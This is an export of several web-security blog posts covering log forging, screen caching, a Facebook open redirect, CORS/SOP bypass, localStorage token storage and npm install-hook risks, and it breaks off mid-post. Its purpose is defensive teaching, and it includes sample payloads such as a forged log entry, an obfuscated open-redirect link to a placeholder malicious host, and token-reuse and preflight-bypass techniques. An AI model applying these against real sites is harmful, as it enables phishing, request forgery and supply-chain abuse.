        "content": "The Log Forging vulnerability, also known as Log Manipulation is a really low ranked vulnerability that in a lot of cases its to farfetched to be reliably exploited, but on others can be quite easy and cause real damage.\nIn this post we\u0026rsquo;ll understand what is log forging and see many different conditions that can cause the vulnerability or to increase the risk.\nWhat is Log Forging Log forging is a vulnerability where an attacker can manipulate the logs, by creating new entries. This usually happens because user input gets directly to the logs without any sanitisation.\nMost traditional log format is a plain text file, where each line is a new entry in the log. If an attacker sends some content with a new line character it can create a new log entry.\nExample:\n1 2 3 4 5  starting webserver received request from 192.168.1.1 received username: thesecurityvault received request from 192.168.1.2 sending ok message   In red is the content received from user input. Since it wasn\u0026rsquo;t properly handled, the user introduced a new line and then faked a new log entry.\nIn this case it could mean that the request to 192.168.1.1 failed somewhere, and that a request to 192.168.1.2 was properly done.\nNot that easy to fake If you look to the example above, to actually fake the behaviour of the log, the attacker needed to know how to log outputs messages, otherwise it won\u0026rsquo;t be that reliable.\nLets see other example of logs:\nWordpress error log:\n1 2 3  [15-Jun-2018 17:24:03 UTC] PHP Warning: Use of undefined constant theme_section - .... [15-Jun-2018 17:24:31 UTC] PHP Warning: Use of undefined constant theme_section ... [20-May-2018 20:39:14 UTC] WordPress database error Table \u0026#39;xyz\u0026#39; doesn\u0026#39;t exist   Checkmarx\u0026rsquo;s scan log:\n1 2  08/03/2018 11:41:54,726 [MainThread_CxEng] INFO Available memory: 9790 Used memory: 307 Elapsed Time: 00:00:07.4013541 [Unspecified] - No Unified languages configured 08/03/2018 11:41:54,776 [MainThread_CxEng] INFO Available memory: 9650 Used memory: 308 Elapsed Time: 00:00:07.4511596 [Unspecified] - Scanning or Auditing Project type code is ...   As you can see in both cases, applications tend to prepend some content to the log message, but the format is not the same for all applications so for an attacker to successfully do a log forging attack it would need to know the format of the prepended data.\nAn attacker can also count with an \u0026ldquo;uneducated\u0026rdquo; user looking at the logs, or hope it wont notice the wrong data.\nIncreased risk for open source or on prem projects If you have an application vulnerable to log forging (and almost all applications I reviewed professionally were) and open source the risk increases significantly because an attacker can study the code and see where user input ends up in the logs and the proper log format.\nThe risk also increases with proprietary software where you have access to logs, like on prem installations, as an attacker can see the log format and can also test locally for vulnerable entry points, then exploit them on other systems.\nVariants JSON Sometimes applications use JSON formatted logs. In this case the new line may not be that relevant as everything inside the string content is part of the log.\nBut there are other issues to take into account here. First, if the logs still uses one line per entry, an attacker can try to trick the victim, the same way, by creating new lines.\nThis is easily spotted by an experienced user, that can see that the string content didn\u0026rsquo;t end on the line break.\nOn the other hand if the JSON log is prepared just by concatenating strings, this can still be an issue.\n1  console.log(`{\u0026#34;Severity\u0026#34;: \u0026#34;INFO\u0026#34;, message: \u0026#34;bad username: ${username}\u0026#34;}`)   In the example above (in javascript), although the log is in JSON format, it was done by just concatenating some user input into a string and an attacker, can escape the string content and create new log entries (attacker input in red):\n1 2  {\u0026#34;Severity\u0026#34;: \u0026#34;INFO\u0026#34;, message: \u0026#34;bad username: \u0026#34;} { \u0026#34;Severity\u0026#34;: \u0026#34;INFO\u0026#34;, message: \u0026#34;DUMPING USER CREDENTIALS \u0026#34; }   To mitigate this attack, in javascript, work with regular JS Objects and at the end use JSON.stringify to convert the object into well formatted javascript. This will prevent the issue.\nLog Viewer Another exploitable scenario may be the log viewer itself, instead of the log. If an application uses a tool to visualize the logs, you can trick the tool to display the log like it was a new entry.\nLets say you created your own log viewer, that parses each line of the log as an entry, and you removed all new lines from user input so that no new lines could be maliciously created.\nAnd when you write the log entries to the webpage, you use something like:\n1  \u0026lt;?php echo $logentry; ?\u0026gt;  This can still cause an issue, as an attacker can inject an html new line () that will be interpreted by the browser. If you just create a new div for each log entry, an attacker could close that div and open a new one.\nHere a log forging vulnerability wouldn\u0026rsquo;t be the major concern, as XSS attacks would be possible through the log input.\nLogging libraries From what I\u0026rsquo;ve seen so far, most log libraries do not have default mechanisms to prevent log forging, although they allow you to create a custom formatter to replace the new lines.\nLet\u0026rsquo;s see some examples\nJava Log4j have built-in mechanisms to help prevent log forging. Unfortunately is up to the developer to specify them. And if you\u0026rsquo;re a developer looking in google how to use these libraries, nobody tell you to use it\u0026hellip;\nWhen configuring the log pattern in the log config file there\u0026rsquo;s a placeholder called encode that can be used to automatically encode new lines:\n1  log4j.appender.stdout.layout.ConversionPattern=%encode{%m}%n   SLF4J\nSLF4J doens\u0026rsquo;t have a default protection but, you can create a custom conversion rule to sanitise new lines, and configure the log pattern with that rule.\nC# Log4net doesn\u0026rsquo;t have a default protection either, but as slf4j you can create a custom pattern convertor to replace new lines. You can read more about it here.\nNode In node, with Winston, if you go with the JSON format it is safely serialised. But if you chose to use the simple format (one line per entry), you don\u0026rsquo;t have a built in way to protect log forging, but you can create a custom format rule.\nRails For rails, the default library doesn\u0026rsquo;t offer any protection either. In the same way as in the other scenarios a custom formatter can be created to sanitise the user input:\n1 2 3 4 5  class SafeFormatter \u0026lt; ::Logger::Formatter def call(severity, timestamp, progname, msg) \u0026#34;#{msg.gsub(/\\n/, \u0026#34;\\\\n\u0026#34;)}\\n\u0026#34; end end   Then set the formatter as the log formatter in \u0026ldquo;config.log_formatter\u0026rdquo; property in config/environment/*\nGo And for go, logrus was actually the only logger that I tested so far that by default sanitised new lines, no config needed, nothing. Kudos.\nI\u0026rsquo;m not a Go dev so I didn\u0026rsquo;t test it a lot, but being safe by default is a huge win IMO.\nTL;DR  Attackers can fake log entries, leading to bad triages or fixes Log forging is hard to exploit if you don\u0026rsquo;t know the format of the log  Bigger issue for open source and on prom software Less relevant for closed source online services (completely blind attacks)   Log viewers can also be leveraged to exploit the vulnerability, and worst case scenario cause XSS JSON formatted logs have a different attack vector Usually loggers are unsafe and is up to the developer to create a protection Protections can usually be done by custom formatters  ", 
        "url": "https:\/\/thesecurityvault.com\/the-log-forging-vulnerability-and-how-to-fix-it\/",
        "summary": "The Log Forging vulnerability, also known as Log Manipulation is a really low ranked vulnerability that in a lot of cases its to farfetched to be reliably exploited, but on others can be quite easy and cause real damage.\nIn this post we\u0026rsquo;ll understand what is log forging and see many different …",
        "preview": "https:\/\/thesecurityvault.com\/the-log-forging-vulnerability-and-how-to-fix-it\//images\/banner.png"
    },
    
    
    
    "https:\/\/thesecurityvault.com\/screen-caching\/": {
        
        "title": "Screen Caching",
        "tags": [],
        "content": "Screen Caching is another of those vulnerabilities nobody is paying attention to, and this one is quite important.\nAs an example, even most bank applications are usually \u0026lsquo;vulnerable\u0026rsquo; to this issue (most of mine are). And this is a reality even for those focusing on security, like web based only banks.\nSo what is screen caching? Screen caching is a mobile vulnerability, caused due to a performance/usability feature present in mobile OS\u0026rsquo;s.\nLet\u0026rsquo;s see an example, you\u0026rsquo;re navigating in your bank account through the mobile app, then you send the application to background and go on with your life.\nWhen you grab back your phone and eventually open the \u0026ldquo;Recent Apps\u0026rdquo; screen you\u0026rsquo;ll see there the bank\u0026rsquo;s application with the sensitive information like your bank account balance. This is specially bad if you are showing something to your friends on your phone, as they can easily see this private information.\n\nHow to Fix it This is an intended behavior from iOS as well as Android, that take a snapshot of the application right before it is backgrounded, to be shown in the App Switcher (iOS) or \u0026ldquo;Recent App\u0026rdquo; screen (Android).\nSo a fix to this issue is to hide the important fields just before the app enters background.\nThere are a few ways to do this, but these are the 2 most common:\n Just before the app enters background open a new view. This is usually done with just the app logofor that. When the app is opened again, hide the screen Hide the fields with sensitive information when the application is being backgrounded. Revert the operation when opening back.  iOS For iOS the easiest way to accomplish this is by using the methods \u0026lsquo;sceneWillResignActive\u0026rsquo; and \u0026lsquo;sceneDidBecomeActive\u0026rsquo; from AppDelegate/SceneDelegate.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  import UIKit import SwiftUI class SceneDelegate: UIResponder, UIWindowSceneDelegate { var window: UIWindow? var screenCachingProtection: UIView! func scene(_ scene: UIScene, willConnectTo session: UISceneSession, options connectionOptions: UIScene.ConnectionOptions) { let contentView = ContentView() if let windowScene = scene as? UIWindowScene { let window = UIWindow(windowScene: windowScene) window.rootViewController = UIHostingController(rootView: contentView) self.window = window window.makeKeyAndVisible() self.screenCachingProtection = UIView.init(frame: window.frame ) self.screenCachingProtection?.backgroundColor = UIColor.white } } func sceneDidDisconnect(_ scene: UIScene) {} func sceneDidBecomeActive(_ scene: UIScene) { self.screenCachingProtection?.removeFromSuperview() } func sceneWillResignActive(_ scene: UIScene) { self.window?.addSubview(self.screenCachingProtection!) } func sceneWillEnterForeground(_ scene: UIScene) {} func sceneDidEnterBackground(_ scene: UIScene) {} }      Screenshots of before and after the fix\nYou can use this as well to show a splash screen or something similar.\nThis code only works for UIKit App Delegate\u0026rsquo;s App lifecycle. If you chose to manage the app lifecycle with SwiftUI I\u0026rsquo;ll update this post with the code for that in the future\nAnother nice trick for iOS is to blur the background. There\u0026rsquo;s a nice comment on StackOverflow for that.\nAndroid Android has native ways to add this protection, being the easiest one, showing a blank screen by specifying a secure flag\nThis can be done by registering the relevant activities as secure in the onCreate method like so:\n1 2 3 4  getWindow().setFlags( WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE );   The downside of this approach is that it will also prevent screenshots from being taken. Instead you can use a similar approach to iOS. Check this StackOverflow answer\n   Screenshots of before and after the fix\n", 
        "url": "https:\/\/thesecurityvault.com\/screen-caching\/",
        "summary": "Screen Caching is another of those vulnerabilities nobody is paying attention to, and this one is quite important.\nAs an example, even most bank applications are usually \u0026lsquo;vulnerable\u0026rsquo; to this issue (most of mine are). And this is a reality even for those focusing on security, like web …",
        "preview": "https:\/\/thesecurityvault.com\/screen-caching\//images\/banner.png"
    },
    
    
    
    "https:\/\/thesecurityvault.com\/how-to-use-facebook-for-open-redirect-attacks\/": {
        
        "title": "How to use Facebook for Open Redirect attacks",
        "tags": [],
        "content": "Some days ago I found an Open Redirect in Facebook website, that I promptly reported to their Bug Bounty Program. There were a lot of warnings that Open Redirect\u0026rsquo;s are usually false positives, but this one looked legit to me.\nFacebook disregarded the report, saying that wasn\u0026rsquo;t exploitable as there are protections in place against it.\nSo this is a blog post of a \u0026ldquo;not\u0026rdquo; open redirect issue in Facebook.\nThe Vulnerability Before moving forward we need to understand what Open Redirect is.\nOpen Redirect happens when a website has a redirect page, that blindly redirects a user to a website provided. This with some social engineering can be used to trick a victim to go to a malicious website.\nLets see an example:\nAssume example.com has an endpoint at /redirect that receives a \u0026ldquo;url\u0026rdquo; query parameter, that when hit, will redirect a user to the url provided:\nhttps://example.com/redirect?url=malicious.com\nAn URL opened by the user would be automatically redirect him to malicious.com.\nAn inexperienced user looking at the URL would assume that he\u0026rsquo;s opening example.com and click on it, but in fact its going to malicious.com\nThis is a simple url, but you can make the url much more complex and obfuscated to that the user doesn\u0026rsquo;t notice whats happening:\nhttps://example.com?token=QSbCZSb05aCbOZo6Zxdr\u0026amp;%75%72%6c=%6d%61%6c%69%63%69%6f%75%73%2e%63%6f%6d\nThis was done by adding a new param, which is ignored by the webpage, and URL encoding the malicious.com website.\nAnd not this becomes a more hard to understand URL, and can easily be used to trick a user.\nProtection Easiest way to protect your website against open redirect attacks is by not automatically redirecting based on user input. In most of the times it is not needed.\nIf you really need to do it, there are a few ways of doing this.\nThe most common one is by showing a warning to the user before a redirect:\n\nYou can see this in action here\n(We will see bellow another and nice way to protect against open redirect)\nOpen Redirect and Facebook Although the above message is displayed by facebook, sometimes this is not enough. In Facebook\u0026rsquo;s case all URL\u0026rsquo;s that you open are in fact a redirect done by facebook.com/l.php or facebook.com/l/\nFacebook uses this mechanism so that every time you open a new link, it goes through one of these two endpoints, so they can collect some data like the link you clicked and when. This can then be used for targeted ads for example.\nNow you are probably asking why you never noticed you are being redirected to these endpoints\u0026hellip; I also had never notice either until a few days, and this was due (probably) to a mistake with the new Facebook interface.\nWhen I wrote this post facebook was in the process of migrating the website to a material like style. And in the old interface, every time you hovered a link this would be what you would get:\n\nIf you notice in the bottom left corner the url doesn\u0026rsquo;t point to one of facebook\u0026rsquo;s endpoints\u0026hellip;\nThis is due to a feature that facebook implemented\u0026hellip; On every link there\u0026rsquo;s an onclick listener that will replace the current URL by one pointing to one of the facebook redirection endpoints.\nBUT, with the migration to the new interface I finally noticed this as it is not in the onclick event (probably a bug):\n\nLink Shims But if every link is a redirect, and as seen above, facebooks warns when leaving the website, how come that we don\u0026rsquo;t see the warning everytime we leave facebook?\nThis is due a nice feature facebook added, called Link Shims.\nAcording to facebook\u0026rsquo;s documentation every link when replaced in the onclick event is added a user specific token. This token makes sure that that link redirect is only to be used by the same user for whom the token was generated.\nThis way, if an attacker copies the url with the token and sends it to another user, it will be invalid and the user will be prompt before leaving facebook. Its a really nice trick.\nBut this is where things start to get complicated as this protection seems to not be working as expected.\nThe issue As I mentioned before, and as is mentioned in the facebook\u0026rsquo;s documentation the token generated should be user specific. This is the only way the token actually protects against Open Redirects.\nUnfortunately this is not what is happening, and the token is not being properly validated, opening the website to the vulnerability.\nTo take advantage of this, an attacker can get the link generated for him, alter the redirecting website and just send it to his victim as in the GIF bellow\n\nTake into consideration the the copy url only worked due to the change in facebook layout that exposed the redirect url. Otherwise you would need other ways to get it.\nI tested this in multiple ways, to make sure it was actually exploitable and these are my findings:\n The token is not being validated properly. It worked for every facebook user I sent the manipulated links, and works even when not logged into facebook There\u0026rsquo;s a blacklist of websites that facebook blocks automatic redirects, independently of the token, like https://evilzone.org/ Although the blacklist, websites with invalid certificates (expired, revoked, untrusted, etc) are not blocked (I used https://badssl.com/ for the tests) Shortened URL\u0026rsquo;s are first resolved to make sure they are not a blacklist URL If you remove the token, it will always warn you before the redirect The token is valid for about 3 hours and 15 minutes. After that facebook will also ask you if you want to be redirected. This may be bad for a phishing email campaign but still works awesome if in a chat conversation, a live event, etc.  Facebook\u0026rsquo;s Response At the time of this writing I\u0026rsquo;ve exchanged a few messages with facebook and they still refuse to accept the vulnerability as they are \u0026ldquo;protected\u0026rdquo; by the linkshims, blacklists, and time based tokens.\nIndependently of all of those protections open redirect is still possible, maybe not for phishing emails due to the time limitations but maybe for a phishing attack on social media, chats, live streams, etc\u0026hellip;\n", 
        "url": "https:\/\/thesecurityvault.com\/how-to-use-facebook-for-open-redirect-attacks\/",
        "summary": "Some days ago I found an Open Redirect in Facebook website, that I promptly reported to their Bug Bounty Program. There were a lot of warnings that Open Redirect\u0026rsquo;s are usually false positives, but this one looked legit to me.\nFacebook disregarded the report, saying that wasn\u0026rsquo;t …",
        "preview": "https:\/\/thesecurityvault.com\/how-to-use-facebook-for-open-redirect-attacks\//images\/banner.png"
    },
    
    
    
    "https:\/\/thesecurityvault.com\/understanding-cors-and-sop-bypass-techniques\/": {
        
        "title": "Understanding CORS and SOP bypass techniques",
        "tags": [],
        "content": "CORS which stands for Cross-Origin Resource Sharing is a system designed to help \u0026lsquo;bypass\u0026rsquo; some of the restrictions introduced by Same Origin Policy (SOP prevents javascript code from interacting with resources from other origins).\nBasically CORS lets us define a set of \u0026lsquo;rules\u0026rsquo; to specify which resources can access responses from our server. By default no rule is defined, so SOP will only allow interactions form the same domain.\nIt is worth notice that SOP/CORS is applied basically for browser\u0026rsquo;s javascript. This means that if you write an application in Java, or even Node, it shouldn\u0026rsquo;t affect you in any way.\nWhat\u0026rsquo;s the point of SOP and CORS? SOP is a huge security mechanism that controls how a resource (like a webpage or scripts) interact with other resources. SOP prevents code from an iframe (loaded with some website\u0026rsquo;s code) from accessing your webpage data, for example. It\u0026rsquo;s an isolation mechanism.\nCORS on the other hand was introduced to help bypassing this restrictions, as sometimes you may want these resources to comunicate between them.\nCORS Response Headers As CORS works through some HTTP headers it\u0026rsquo;s important to understand which the most common headers used. Lets take a look at some:\nAccess-Control-Allow-Origin This is the most important header as it specifies which origins can access the server resources:\nAccess-Control-Allow-Origin: https://thesecurityvault.com\nIf a server sends the header above, it will instruct the browser that it accepts Cross Origin requests from https://thesecurityvault.com\nA wild card can be set, although not recommended\nAccess-Control-Allow-Methods Like the header above, this one instructs which method can be invoked\nAccess-Control-Allow-Methods: POST, GET, OPTIONS\nIn this case we are allowing other webpages to do POST, GET and OPTION requests to our server\nAccess-Control-Allow-Headers Specifies which headers can be sent.\nAccess-Control-Request-Headers: X-Some-Header\nCORS Preflight request The preflight request is a request automatically sent by the browser to check if the server knows about CORS and if it allows the request.\nThis is where things start to get tricky, because not all requests trigger a preflight request.\nTo not trigger a preflight request this is what\u0026rsquo;s needed:\n Method: The HTTP method needs to be a GET, POST or HEAD Headers: Besides the default headers automatically injected, only CORS safe headers can be set. Content Type: Needs to be \u0026lsquo;application/x-www-form-urlencoded\u0026rsquo;, \u0026lsquo;text/plain\u0026rsquo; or \u0026lsquo;multipart/form-data\u0026rsquo;. ReadableStram: Do not open a ReadableStram in the request No Listeners on XMLHttpRequestUpload  Mozilla has an awesome documentation about this as well.\nExamples Lets see some examples\u0026hellip; I like to use https://webhook.site to test requests. It\u0026rsquo;s really nice and powerful.\nLets start by something that we know will trigger a preflight request:\n1  fetch(\u0026#34;https://webhook.site/17ac55b4-c06e-4a7a-9c5a-314c60b57b87\u0026#34;, {method: \u0026#39;PATCH\u0026#39;, headers: {\u0026#39;content-type\u0026#39;: \u0026#39;text/plain\u0026#39;}, body: \u0026#39;thesecurityvault\u0026#39;}).then(r =\u0026gt; console.log(r.body)).catch(() =\u0026gt; console.log(\u0026#34;failed\u0026#34;))   \nWe have an error in the browser, but lets see in webhook:\n\nWe have an OPTIONS request, but no patch\u0026hellip; so the method was blocked by CORS\u0026hellip;\nNow lets try with a request that will not trigger a preflight request:\n1  fetch(\u0026#34;https://webhook.site/17ac55b4-c06e-4a7a-9c5a-314c60b57b87\u0026#34;, {method: \u0026#39;GET\u0026#39;, headers: {\u0026#39;content-type\u0026#39;: \u0026#39;text/plain\u0026#39;}}).then(r =\u0026gt; console.log(\u0026#34;done\u0026#34;)).catch(() =\u0026gt; console.log(\u0026#34;failed\u0026#34;))   \nAs you can see, we had a CORS error, as the page at \u0026lsquo;https://webhook.site/17ac55b4-c06e-4a7a-9c5a-314c60b57b87' is not allowing CORS requests.\nBut lets see what heppens, at the webhook side:\n\nAs you can see webhook successfully received a GET request. No preflight, which according to the rules above makes sense. We sent an allowed method, an allowed content type, no extra headers\u0026hellip;\nNow if we try for example to set a POST with a body like:\n1  fetch(\u0026#34;https://webhook.site/17ac55b4-c06e-4a7a-9c5a-314c60b57b87\u0026#34;, {method: \u0026#39;POST\u0026#39;, headers: {\u0026#39;content-type\u0026#39;: \u0026#39;text/plain\u0026#39;}, body: \u0026#39;thesecurityvault\u0026#39;}).then(r =\u0026gt; console.log(r.body)).catch(() =\u0026gt; console.log(\u0026#34;failed\u0026#34;))   \n\nWe still have the error in the browser, but the request keeps being made.\nSo what happens when no preflight is made is that the browser will only know how to comply with CORS policy when receives a response with the relevant headers, so the request is made anyway, but if a CORS policy is set it will only block the response\u0026hellip;\nSOP really helps out preventing some attacking techniques, like CSRF, but with the right conditions, as seen above it can be bypassed.\nHTML\u0026rsquo;s Form tag The preflight rules above may seem a little bit weird\u0026hellip; Why doesn\u0026rsquo;t a regular post request trigger a preflight request? Looks like a poor design\u0026hellip;\nIn fact this has its logic underneath\u0026hellip; and part of it is the tag. If you look carefully for the rules to trigger the preflight you will notice that a form tag will never trigger a preflight, and it shouldn\u0026rsquo;t, otherwise it would just brake a lot of websites.\nSo this may by a good attack vector for what we\u0026rsquo;ve seen above. Older websites are still heavily depending on forms, so most of those requests are being sent with \u0026lsquo;application/x-www-form-urlencoded\u0026rsquo; which we already know that can be bypassed with fetch, or even with other form tags\nJSONP JSONP (Json with Padding) is an old hack to bypass Some Origin Policy, from the time when we didn\u0026rsquo;t have CORS. It basically consists on using a script tag to get some json data, with a prefixed method (the padding), which ends up being just javascript code\nBasically a webpage would call a script like:\n1  \u0026lt;script type=\u0026#34;javascript\u0026#34; src=\u0026#34;https://thesecurityvault.com/somedata?callback=processData\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;   and notice the callback query param, that would be used by the server, to wrap the entire response data:\n1 2 3 4  processData({ username: \u0026#39;Luis Fontes\u0026#39;, website: \u0026#39;thesecurityvault.com\u0026#39; })   This code would be injected into the webpage, calling the processData method.\nThis still works, but shouldn\u0026rsquo;t be used, specially because JSONP can be a security risk, causing XSS or Reflected File Download\nCORS Proxy The easiest and faster way to bypass SOP when doing requests is by using a CORS proxy. This can basically inject the headers (seen above) in the responses allowing all types of requests from all origins.\nThere are some nice online CORS proxy tools like https://corsproxy.github.io/\nUsing this services may raise some security concerns like is the proxy sniffing the data you send/receive from it?\nBest approach to go with a CORS proxy would be to use an open source tool, and deploy it yourself.\nYou can also use SharpCorsProxy which is an OpenSource project I did some time ago.\nNull Origin Some times, developers tend to add \u0026lsquo;null\u0026rsquo; as an allowed origin in CORS policy. This is to help on local developments as local pages usually have \u0026lsquo;null\u0026rsquo; as origin. This is sometimes forgotten, and you can even see this config in production environments.\nGetting a null origin is fairly easy, you can get it by having a local page, or just by doing a request inside an iframe.\n", 
        "url": "https:\/\/thesecurityvault.com\/understanding-cors-and-sop-bypass-techniques\/",
        "summary": "CORS which stands for Cross-Origin Resource Sharing is a system designed to help \u0026lsquo;bypass\u0026rsquo; some of the restrictions introduced by Same Origin Policy (SOP prevents javascript code from interacting with resources from other origins).\nBasically CORS lets us define a set of …",
        "preview": "https:\/\/thesecurityvault.com\/understanding-cors-and-sop-bypass-techniques\//images\/banner.png"
    },
    
    
    
    "https:\/\/thesecurityvault.com\/auth-token-in-localstorage\/": {
        
        "title": "Auth Token in LocalStorage",
        "tags": [],
        "content": "Getting right to the point: storing a token in LocalStorage is insecure.\nIt\u0026rsquo;s getting more and more common to use token based authentication, specially on Single Page Applications (SPA) that need to communicate with an API. That is a good thing, and I really like the idea of JWT tokens.\nWhy localStorage is bad Well, when working with cookies, the golden rule is that when storing sensitive information like an auth token, or a session, the cookie should be marked as httpOnly. This means that it cannot be accessed by javascript, preventing this way an attacker from stealing the sessions from other users if they find for example an XSS attack or if a javascript dependency included in the app gets compromised.\nSo the same way we want cookies to be httpOnly (and nowadays also to have the Secure flag) why would we store a token in localstorage? It has an API to fully control it from javascript, so, no, localStorage is not good enough to store this sensitive data (more about it here).\nSessionStorage has an identical concept, WebSQL and IndexedDB are also accessible through javascript. So where to go?\nCookies Yeah, I know\u0026hellip; You have an API and stuff and your API\u0026rsquo;s shouldn\u0026rsquo;t use cookies, because it\u0026rsquo;s considered a bad practice.\nIn fact, cookies are still the best and secure place to save the auth token for a webapp. You can mark it as httponly, which means that javascript code can\u0026rsquo;t access it. And if you need to send it in an XHR request the bowsers also do it for you by default if in the same domain. If you are doing a request to a different domain you need to use the [withCredentials](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/withCredentials) options.\nYou can also set the cookie as secure, which means that the cookie is being sent only over the HTTPS connections.\nBut sometimes cookies are not the solution\u0026hellip;\nWhen cookies are not the solution If you have an application that doesn\u0026rsquo;t have a backend (which is not that common) you can\u0026rsquo;t generate cookies. In this case you have two options:\n You have a Single Page Application (SPA) and you can keep the token in memory. This maybe a have some usability problems, like if the user opens a new tab of closes and reopens the page, of even if refreshes it LocalStorage - This is the bad solution. Unfortunately it has a better user experience. But again an app without a backend is quite uncommon, so my recommendation would just be to create one.  If your login system is in a different domain besides the withCredentials that you need to set in the XHR requests you also need to change the CORS rules to allow the requests from the domain of the frontend.\nDon\u0026rsquo;t forget CSRF Not using cookies had its advantages and one of them was that you didn\u0026rsquo;t have CSRF attack vectors (unless using BasicAuth). If you get back to cookies you may have this old attack vector back. But not always.\nIf you have a specific set of conditions you may be safe from CSRF using cookies. Let\u0026rsquo;s take a look at them:\n Not using GET method to do state changing actions - This is the most important rule and an important best practice. Have a restrictive CORS policy - Do not allow requests from URL\u0026rsquo;s others then the one from your frontend Accept only JSON and XML content - An attacker has two ways to \u0026lsquo;trick\u0026rsquo; a victim into doing a request. Using an html form tag, or a XHR request. The XHR request is already covered because of the CORS policy. The form tag can only send text, url encoded or form encoded content.  But have in mind that most of frameworks accepts text/plain content type and then convert it to the expected one, so always make sure plain content type is not enabled.\nif you meet these 3 conditions you don\u0026rsquo;t need to worry with CSRF again, Otherwise don\u0026rsquo;t forget to add the the protection.\nTo wrap up: do not store auth token in localstorage.\n", 
        "url": "https:\/\/thesecurityvault.com\/auth-token-in-localstorage\/",
        "summary": "Getting right to the point: storing a token in LocalStorage is insecure.\nIt\u0026rsquo;s getting more and more common to use token based authentication, specially on Single Page Applications (SPA) that need to communicate with an API. That is a good thing, and I really like the idea of JWT tokens.\nWhy …",
        "preview": "https:\/\/thesecurityvault.com\/auth-token-in-localstorage\//images\/banner.png"
    },
    
    
    
    "https:\/\/thesecurityvault.com\/security-of-the-npm-packages\/": {
        
        "title": "Security of the NPM Packages",
        "tags": [],
        "content": "Javascript (and typescript) is now one of the most used languages in new projects. It has an awesome performance, and Promises came to improve it even more. With it came tons of new tools and projects like Node and NPM. But not all is good, the security of the NPM packages is a worrying problem. Lets talk about it.\nNPM stands for \u0026ldquo;Node Package Manager\u0026rdquo; and its a really easy to use tool to get and install dependencies for our projects. But this ease of use can also be used by malicious users.\nLets start by creating a simple project:\n1  npm init   I just created one with the default options and this is the package.json generated:\n1 2 3 4 5 6 7 8 9 10 11  { \u0026#34;name\u0026#34;: \u0026#34;thesecurityvault\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;index.js\u0026#34;, \u0026#34;scripts\u0026#34;: { \u0026#34;test\u0026#34;: \u0026#34;echo \\\u0026#34;Error: no test specified\\\u0026#34; \u0026amp;\u0026amp; exit 1\u0026#34; }, \u0026#34;author\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;license\u0026#34;: \u0026#34;ISC\u0026#34; }   Now looking at the scripts option. You can create your own scripts to run. This means that you specify a set of commands to run, OS commands.\nI just added a new script:\n1 2 3 4 5 6 7 8 9 10 11 12  { \u0026#34;name\u0026#34;: \u0026#34;thesecurityvault\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;index.js\u0026#34;, \u0026#34;scripts\u0026#34;: { \u0026#34;test\u0026#34;: \u0026#34;echo \\\u0026#34;Error: no test specified\\\u0026#34; \u0026amp;\u0026amp; exit 1\u0026#34;, \u0026#34;list:dir\u0026#34;: \u0026#34;ls\u0026#34; }, \u0026#34;author\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;license\u0026#34;: \u0026#34;ISC\u0026#34; }   And if you run it, the ls command will be executed:\n\nExecuting commands without the user knowing This is where things start to go south. You can create commands to do basically anything, but tricking an user of your module to run them is not that easy\u0026hellip; first because they need to know the name of the script to run, and when they look at it they may find out that its doing something shady\u0026hellip; But what if the user didn\u0026rsquo;t had to run anything?\nYes, that is possible due to the default script hooks available by NPM. The following are the available hooks accepted by NPM (took from the docs):\n prepublish: Run BEFORE the package is packed and published, as well as on local npm install without any arguments. (See below) prepare: Run both BEFORE the package is packed and published, on local npm install without any arguments, and when installing git dependencies (See below). This is run AFTER prepublish, but BEFORE prepublishOnly. prepublishOnly: Run BEFORE the package is prepared and packed, ONLY on npm publish. (See below.) prepack: run BEFORE a tarball is packed (on npm pack, npm publish, and when installing git dependencies) postpack: Run AFTER the tarball has been generated and moved to its final destination. publish, postpublish: Run AFTER the package is published. preinstall: Run BEFORE the package is installed install, postinstall: Run AFTER the package is installed. preuninstall, uninstall: Run BEFORE the package is uninstalled. postuninstall: Run AFTER the package is uninstalled. preversion: Run BEFORE bumping the package version. version: Run AFTER bumping the package version, but BEFORE commit. postversion: Run AFTER bumping the package version, and AFTER commit. pretest, test, posttest: Run by the npm test command. prestop, stop, poststop: Run by the npm stop command. prestart, start, poststart: Run by the npm start command. prerestart, restart, postrestart: Run by the npm restart command. Note: npm restart will run the stop and start scripts if no restart script is provided. preshrinkwrap, shrinkwrap, postshrinkwrap: Run by the npm shrinkwrap command.  We can see some interesting callbacks here: preinstall and install. This hooks will run before installing the package, and after installing it (respectively). If we add the ls command on the install hook, everytime an user installs the package the ls command will run. Can you see the possible security problems here?\nAdding Javascript to the mix One of the things that Javascript does quite well is the sandbox. Javascript has a really secure sandbox, preventing you from accessing for example the FileSystem. On the other side, Node \u0026ldquo;breaks\u0026rdquo; all of this security, so you can access the filesystem or even execute commands through Node\u0026rsquo;s API.\nInstead of just running OS commands (which is also good) you can leverage Javascript with the Node\u0026rsquo;s API to have a more friendly language (well, at least for me :) )to write some malicious code. At the end you can call your script through node in the install hook.\nSome NPM Statistics This already is a bit (a lot) scary, and thinking that there are more than one million packages and billions of downloads monthly gets even darker.\n\nYou may be carefull when installing a package, and even review the source code of the package (I\u0026rsquo;ll get back to this later) but what about all the dependencies that that package has? And when one of those gets updated, do you check the changes?\nThe open source community is something awesome both for individuals and for companies, its a huge help for all developers, and everybody should contribute to it. But it is also a giant attack vector for people with bad intentions.\nGetting into the packages and dependencies Lets see a real example, and understand the implications of the dependencies of a module.\nI really like to develop in angularjs and unfortunately I didn\u0026rsquo;t have time (yet) to dig into React framework. But angularjs is an awesome example. You have \u0026ldquo;angular\u0026rdquo; which is the new versions of angular and in Typescript. And you have \u0026ldquo;angularjs\u0026rdquo; which is the initial version, for javascript which google stopped development in favor of \u0026ldquo;angular\u0026rdquo;. So the name of \u0026ldquo;angularjs\u0026rdquo;\u0026rsquo;s package in NPM is \u0026ldquo;angular\u0026rdquo;.\nYeah\u0026hellip; not good, but worst than that, is that there\u0026rsquo;s actually an angularjs package which the package description says its 